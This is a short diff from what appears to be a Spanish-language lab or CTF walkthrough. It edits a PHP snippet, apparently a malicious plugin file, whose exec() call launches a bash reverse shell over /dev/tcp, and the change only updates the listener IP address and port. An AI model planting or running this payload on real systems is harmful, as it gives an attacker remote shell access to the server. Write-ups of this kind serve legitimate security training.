@@ -288,7 +288,7 @@ Una vez que tenemos acceso tendremos que obtener una revershell, esto con ayuda 
 * Author: Vince Matteo
 * Author URI: http://www.sevenlayers.com
 */
-exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.226.5/443 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.2.19/9001 0>&1'");
 ?>
 ```
 
